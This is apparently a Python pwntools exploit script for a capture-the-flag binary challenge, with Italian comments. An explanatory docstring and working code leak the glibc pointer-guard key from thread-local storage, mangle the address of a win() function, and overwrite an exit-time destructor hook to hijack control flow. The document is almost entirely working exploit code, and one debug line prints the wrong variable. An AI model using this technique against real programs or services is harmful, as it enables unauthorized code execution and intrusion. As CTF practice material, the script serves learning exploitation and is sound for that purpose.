#!/usr/bin/env python3
import os
import sys
import subprocess
from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
context.binary = exe

URL = ''
PORT = 0

def start(argv=[], *a, **kw):
    # template fatto da greyhat00 per chi viene dopo.
    # usalo liberamente per imparare e sperimentare.
    # buona fortuna, lettore. Happy pwn!
    if args.R2:
        io = process([exe.path] + argv, *a, **kw)
        # changeme sys.main
        # parametri di r2 personalizzabili
        # es:
        # r2_cmd = "r2 -c 'db sym.foo+122; dc; Vpp; px @ section..got' -d " + str(io.pid)
        r2_cmd = "r2 -c 'db sym.imp.exit; dc; Vpp' -d " + str(io.pid)
        
        subprocess.Popen(
            [
            "x-terminal-emulator",                  # open systen default terminal emulator
             "-e", 
             os.environ.get("SHELL", "/bin/sh"),    # execute default shell
             "-c", 
             r2_cmd],                               # with radare2 command
            stdout=subprocess.DEVNULL,
            stderr=subprocess.STDOUT
        )
        # pause the current python script until key pressed
        # manually added to avoid race condition waiting for r2 to start     
        ui.pause()
        return io

    if args.REMOTE:
        try:
            host = sys.argv[1]
            port_val = int(sys.argv[2])
        except (IndexError, ValueError):
            host = URL
            port_val = PORT

        if not host or not port_val:
            log.error(
                "REMOTE mode selected but HOST or PORT is missing or invalid.\n"
                "Usage example:\n"
                "  ./exploit.py REMOTE 8.8.8.8 9999\n"
                "Or set URL and PORT variables in the script."
            )
            exit(1)

        log.info("Connecting to remote"+ str(host) + str(port_val))
        return remote(host, port_val, ssl=True)

    else:
        log.info("Launching local process")
        return process([exe.path] + argv, *a, **kw)

def leak(addr):
    io.sendline(f"{addr}".encode())
    leak = io.recvline().strip().decode()
    return int(leak, 16)

'''
Il programma presenta 3 leak a piacimento ed una scrittura a piacimento.
Il programma non termina con return, e la GOT e' full relo, impedendo exploit classici.
Il programma termina con un exit(0);


Quando viene invocata exit(), la glibc avvia un loop di pulizia per eseguire i 
distruttori delle librerie caricate. Queste funzioni sono memorizzate all'interno di liste
di puntatori in zone scrivibili, rendendole un bersaglio perfetto per dirottare il
flusso.

Le glibc moderne proteggono questi puntatori a funzione cifrandoli con una chiave casuale
a 64 bit generata dal kernel ad ogni avvio.
Essa risiede nel Thread Local Storage, puntato dal registro FS a FS:[0x30].
La formula di offuscamento nativa è: 
    Mangled_Ptr = (Real_Ptr ^ Key) <<< 17

Exploit:

1. Prendere la chiave:
   Sfruttando il leak iniziale della base del dynamic linker (ld.so), calcoliamo 
   l'offset costante del TLS (letto e calcolato da Radare2). 
   Con la prima lettura arbitraria leggiamo FS:[0x30] 
   estranendo la chiave segreta.

2. Verifica:
   Leggiamo un puntatore sensibile noto e già cifrato in memoria.
   Applichiamo la formula inversa di De-mangling:
       Demangled_Ptr = (Mangled_Ptr >>> 17) ^ Key
   Se il risultato punta ad una funzione reale di sistema, l'algoritmo è corretto.

3. Consumiamo i leak:
   Il programma obbliga a fare 3 letture nel cicl. Usiamo la terza su un indirizzo 
   innocuo.

4. Sovrascriviamo un indirizzo con la win cifrata:
   Cifriamo manualmente l'indirizzo di win() invertendo i passaggi della glibc:
       Payload = ((win_addr ^ Key) <<< 17)
   Usiamo la scrittura finale per sovrascrivere l'hook originale con il payload.

Al termine del main, exit() decifrerà il nostro fake-hook usando la chiave reale, 
rivelando l'indirizzo pulito di win().
'''
io = start()
io.recvline()
ld_leak = io.recvline().strip().decode()
ld_leak = int(ld_leak, 16)

success(f"LD leak: {hex(ld_leak)}")
ld.address = ld_leak
fs = ld.address - 2099392           # Offset calcolato con radare2
recursive_ld = ld.address - 86024   # Zona dove risiede la lista di funzioni

success(f"FS leak      @ {hex(fs)}")
success(f"FS key       @ {hex(fs+0x30)}")
success(f"_rtld_global @ {hex(ld.sym['_rtld_global'])}")
success(f"recursive_ld @ {hex(recursive_ld)}")
io.recvline()

def demangle(obfuscated_ptr, key):
    rotated = ((obfuscated_ptr >> 17) | (obfuscated_ptr << (64 - 17))) & 0xffffffffffffffff
    return rotated ^ key

def mangle(target_addr, key):
    xor_res = target_addr ^ key
    mangled = ((xor_res << 17) | (xor_res >> (64 - 17))) & 0xffffffffffffffff
    return mangled

fs_key = leak(fs+0x30)
test_leak = leak(recursive_ld)
success(f"FS key: {hex(fs_key)}")
success(f"Test leak: {hex(fs_key)}")
success(f"demangled: {hex(demangle(test_leak, fs_key))}")
mangled_win = mangle(exe.sym['win'], fs_key)
success(f"mangled win: {hex(mangled_win)}")

# leak inutile
io.sendline(f"{exe.got['printf']}".encode())


io.sendline(f"{recursive_ld}".encode()) # where
io.sendline(f"{mangled_win}".encode())  # what

io.interactive()
